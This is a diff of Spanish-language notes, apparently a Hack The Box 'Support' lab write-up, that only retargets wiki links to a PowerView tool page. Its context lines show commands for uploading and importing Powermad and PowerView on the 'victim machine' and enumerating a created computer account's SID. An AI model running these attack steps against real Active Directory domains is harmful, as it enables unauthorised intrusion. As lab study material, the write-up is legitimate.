@@ -267,7 +267,7 @@ En la maquina victima lo subimos usando
 upload /home/jalag/Workzone/VPN/HTB/Machines/WorkLab/Support/content/Powermad.ps1
 ```
 
-Subimos tambien [[POWERVIEW]]
+Subimos tambien [[00.- Herramientas/POWERVIEW]]
 ```shell
 upload /home/jalag/Workzone/VPN/HTB/Machines/WorkLab/Support/content/powerview.ps1
 ```
@@ -277,7 +277,7 @@ Lo importamos para que sea interpretado
 Import-Module .\Powermad.ps1
 ```
 
-Y lo mismo para [[POWERVIEW]]
+Y lo mismo para [[00.- Herramientas/POWERVIEW]]
 ```shell
 Import-Module .\powerview.ps1
 ```
@@ -292,7 +292,7 @@ Comprobamos si se ha creado
 Get-DomainComputer SERVICEA
 ```
 
-Enumeraremos el SID con [[POWERVIEW]]
+Enumeraremos el SID con [[00.- Herramientas/POWERVIEW]]
 ```shell
 $ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
 ```
